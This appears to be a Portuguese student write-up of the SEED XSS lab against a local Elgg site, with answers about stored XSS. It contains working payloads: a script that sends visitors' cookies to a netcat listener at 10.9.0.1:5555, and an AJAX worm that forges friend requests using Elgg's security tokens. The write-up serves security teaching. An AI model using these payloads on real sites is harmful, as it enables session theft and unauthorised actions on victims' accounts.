# Questão 1

## Task1

Nós começamos por adicionar o website "www.seed-server.com" que vamos usar para esta tarefa à lista de hosts. Para isso, usamos este comando:
``` shell 
sudo nano /etc/hosts
```
para obter a lista dos hosts atuais, escrevemo-lo e salvamos o ficheiro. Depois, contruímos e iniciamos o container pretendido com: 

``` shell 
docker-compose build
docker-compose up
```

Verificamos os containers atuais com dockps:

![dockps](img/dockps.png)

Com o container aberto, visitamos o website mencionado e inserimos as credenciais de um usuário, por exemplo, o Boby. Após entrar no perfil, editámos o campo "About me" com código html: 

``` html
<script>alert('XSS');</script>
```

Na segunda parte da tarefa, críamos um ficheiro chamado myscripts.js e inserimos o seguinte alerta nesse ficheiro: `alert('XSS Attack');`.

Para garantir que o arquivo myscripts.js fique acessível pela web, adicionamos a seguinte linha ao Dockerfile.

``` shell
COPY elgg/myscripts.js /var/www/elgg/
```

Voltamos a contruir e iniciar o container.
No final, atualizámos o "About me" do prefil com este código:

``` html
<script type="text/javascript" src="http://www.seed-server.com/myscripts.js"></script>
```

e obtivemos um alerta XSS como esperado.

![xss1](img/alert_xss.png)


## Task2

Para esta tarefa alteramos o ficheiro myscripts.js com o alerta dado: `alert(document.cookie);`.

Depois, construímos, iniciamos o container como fizemos na task anterior e voltamos a abrir o perfil do Boby. Desta vez observámos um cookie a aparecer no ecrã com uma série de informações.

![cookie](img/cookie_xss.png)

## Task3

Nesta tarefa, usamos a netcat no terminal com o comando dado para conseguir os dados do website: `nc -lknv 5555`.

De seguida, voltamos a alterar o ficheiro myscripts.js, desta vez com o seguinte código:

``` html
document.write('<img src="http://10.9.0.1:5555?c=' + encodeURIComponent(document.cookie) + '" >');
```

Este código permite escrever os dados do cookie no netcat com um endereço.

Por último, contruímos e iniciamos o container novamente e verificamos que os dados do cookie aparecem no terminal conforme pretendido.

![5555](img/5555_xss.png)

## Task4

Nesta tarefa, nós usamos a extenção "HTTP Header Live" para encontrar o path que nos leva ao pedido de amizade.
Começamos por ligar a extenção, abrimos o perfil de outro usuário e carregamos em "add friend" no perfil do Samy para ver o que acontecia. Apareceu na janela do HTTP Header live o seguinte path:

```shell
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1731610540&__elgg_token=QBVHzLh_7fNOJkCLghebqg&__elgg_ts=1731610540&__elgg_token=QBVHzLh_7fNOJkCLghebqg
```

Com base nisto, podemos pegar no código javascript fornecido e completar o HTTP request como o inicio do path, junto com o ts e o token da seguinte maneira:

``` html
<script type="text/javascript">
window.onload = function () {
    var Ajax = null;
    
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    
    //Construct the HTTP request to add Samy as a friend.
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

    //Create and send Ajax request to add friend
    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
};
</script>
```

Com o código completo, abrimos a conta do Samy, carregamos em "editar perfil" e escrevemos este código atualizado no campo "About me".
Por fim, nós abrímos a conta da Alice (por exemplo), fomos a lista de amigos e verificamos que estava vazia. Depois, fomos ao perfil do Samy, voltamos a lista de amigos, e apareceu o samy como amigo que era o pretendido.

![final](img/final_xss.png)

### Questão 1 
A linha 1 obtém o token `__elgg_ts`, que representa um timestamp de segurança gerado pelo servidor para identificar e verificar a validade da requisição. 

A linha 2 obtém o token `__elgg_token`, que é um token de segurança exclusivo que valida se a requisição é feita a partir de um usuário autenticado.

Estes tokens dinâmicos são gerados a cada sessão. Esses valores são extraídos diretamente da sessão do usuário, garantindo que a requisição seja autenticada.

### Questão 2 
Se o website apenas usasse o modo de texto no campo "About me", seria ímpossivel realizar o ataque, uma vez que o script era lido como um formato de texto, e depois quando convertido para html, seria inofensivo para o website. 

Para além disso, o código apareceria no campo "About me" para todos os usuários se o perfil fosse público.

# Questão 2

Este ataque é classificado como um Stored XSS, pois o código malicioso é inserido e armazenado diretamente no campo "About me" do perfil de Samy. Sempre que outro usuário visita essa página de perfil, o script malicioso é carregado e executado automaticamente no navegador do visitante, sem a necessidade de interação adicional.

Este ataque não é um Reflected XSS porque, nesse tipo de ataque, o código malicioso seria enviado ao servidor e imediatamente "refletido" de volta ao navegador do usuário, como resposta a uma solicitação (geralmente através de parâmetros de URL ou formulários). No caso do ataque atual, o código é armazenado de forma persistente no servidor e executado repetidamente para cada visitante do perfil de Samy.

Também não se trata de um DOM-based XSS, que ocorre quando o código malicioso manipula o DOM (Document Object Model) diretamente no navegador, sem depender de uma resposta do servidor. No Stored XSS, como neste caso, a vulnerabilidade está no servidor, onde o código malicioso é salvo e injetado diretamente nas páginas que o servidor envia para o navegador do usuário.

